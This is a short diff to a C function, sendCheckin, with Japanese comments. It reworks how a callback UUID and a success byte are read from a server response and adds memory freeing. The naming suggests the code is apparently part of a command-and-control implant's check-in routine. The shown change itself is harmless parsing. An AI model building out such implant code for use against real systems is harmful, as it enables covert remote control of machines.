@@ -27,14 +27,20 @@ BOOL sendCheckin(PCONFIG_CORN corn){
     SIZE_T szSuccess = 1;
     SIZE_T szCallBackUUID = 36;
 
-    if(getByte(response, &szSuccess) == 0x00){
-        // ! エラー時にメモリ解放
-        freeParser(response);
-        return FALSE;
+    PBYTE pSuccess = getByte(response, &szSuccess);
+    BYTE success = *pSuccess;
+    LocalFree(pSuccess);
+
+    if(success == 0x00){
+    freeParser(response);
+    return FALSE;
     }
 
-    CHAR callBackUUID[36] = (CHAR)getByte(response, &szCallBackUUID);
+
+    PBYTE callBackUUID = getByte(response, &szCallBackUUID);
     memcpy(corn->callBackuuid, callBackUUID, 36);
+
+    LocalFree(callBackUUID);
     
     // ! メモリ解放
     freeParser(response);
